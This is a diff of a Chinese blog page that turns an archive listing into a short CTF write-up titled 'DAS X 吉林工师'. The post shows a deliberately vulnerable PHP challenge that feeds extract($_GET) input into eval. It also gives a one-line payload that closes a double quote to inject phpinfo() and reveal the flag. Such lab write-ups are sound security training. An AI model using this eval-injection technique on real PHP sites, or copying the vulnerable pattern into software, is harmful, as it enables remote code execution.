@@ -17,9 +17,25 @@
   <meta name="description" content="BLOG">
   <meta name="author" content="">
   <meta name="keywords" content="">
-  <title>归档 - 1__/\/のblog</title>
+  <title>DAS X 吉林工师 - 1__/\/のblog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/arduino-light.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
 
 
 
@@ -54,7 +70,7 @@
 
 
 <body>
-  <header style="height: 60vh;">
+  <header style="height: 100vh;">
     <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
     <a class="navbar-brand"
@@ -153,13 +169,54 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="归档">
+            <span class="h2" id="subtitle" title="DAS X 吉林工师">
               
             </span>
 
             
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-10-29 23:25" pubdate>
+        2021年10月29日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      132 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      4
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
           </div>
 
+          
+            <div class="scroll-down-bar">
+              <i class="iconfont icon-arrowdown"></i>
+            </div>
           
         </div>
       </div>
@@ -168,46 +225,126 @@
 
   <main>
     
-      <div class="container nopadding-md">
-        <div class="py-5" id="board"
-          >
-          
-          <div class="container">
-            <div class="row">
-              <div class="col-12 col-md-10 m-auto">
-                
-
-<div class="list-group">
-  <p class="h4">共计 130 篇文章</p>
-  <hr>
-  
-  
-    
       
-      <p class="h5">2021</p>
-    
-    <a href="/2021/10/29/DAS/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">DAS X 吉林工师</span>
-      <time style="float: right;">10-29</time>
-    </a>
-  
-    
-    <a href="/2021/10/10/%E9%B9%A4%E5%9F%8E%E6%9D%AF/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">鹤城杯</span>
-      <time style="float: right;">10-10</time>
-    </a>
-  
-</div>
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">DAS X 吉林工师</h1>
+            
+            <div class="markdown-body">
+              <h2 id="迷路的魔法少女"><a href="#迷路的魔法少女" class="headerlink" title="迷路的魔法少女"></a>迷路的魔法少女</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+highlight_file(<span class="hljs-string">&#x27;index.php&#x27;</span>);
+
+extract($_GET);
+error_reporting(<span class="hljs-number">0</span>);
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">String2Array</span>(<span class="hljs-params">$data</span>)</span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-keyword">if</span>($data == <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>();
+    @<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;\$array = <span class="hljs-subst">$data</span>;&quot;</span>);
+    <span class="hljs-keyword">return</span> $array;
+&#125;
 
 
+<span class="hljs-keyword">if</span>(is_array($attrid) &amp;&amp; is_array($attrvalue))
+&#123;
+        $attrstr .= <span class="hljs-string">&#x27;array(&#x27;</span>;
+        $attrids = count($attrid);
+        <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>; $i&lt;$attrids; $i++)
+        &#123;
+            $attrstr .= <span class="hljs-string">&#x27;&quot;&#x27;</span>.intval($attrid[$i]).<span class="hljs-string">&#x27;&quot;=&gt;&#x27;</span>.<span class="hljs-string">&#x27;&quot;&#x27;</span>.$attrvalue[$i].<span class="hljs-string">&#x27;&quot;&#x27;</span>;
+            <span class="hljs-keyword">if</span>($i &lt; $attrids<span class="hljs-number">-1</span>)
+            &#123;
+                $attrstr .= <span class="hljs-string">&#x27;,&#x27;</span>;
+            &#125;
+        &#125;
+        $attrstr .= <span class="hljs-string">&#x27;);&#x27;</span>;
+&#125;
 
+String2Array($attrstr);</code></pre></div>
 
+<p>突破点在<code>attrvalue</code>上</p>
+<p>payload：<code>?attrid[]=&amp;attrvalue[]=1&quot;,11=&gt;phpinfo(),&quot;11&quot;=&gt;&quot;2</code></p>
+<p>flag在<code>phpinfo()</code>中</p>
+<p>通过闭合双引号让<code>eval</code>执行命令</p>
 
-              </div>
             </div>
-          </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/sqli/">sqli</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/tags/WP/">WP</a>
+                    
+                      <a class="hover-with-bg" href="/tags/sqli/">sqli</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/10/10/%E9%B9%A4%E5%9F%8E%E6%9D%AF/">
+                        <span class="hidden-mobile">鹤城杯</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
         </div>
       </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+
+
     
 
     
@@ -290,9 +427,15 @@
 
 
 
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
 
 
 
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
 
 
 
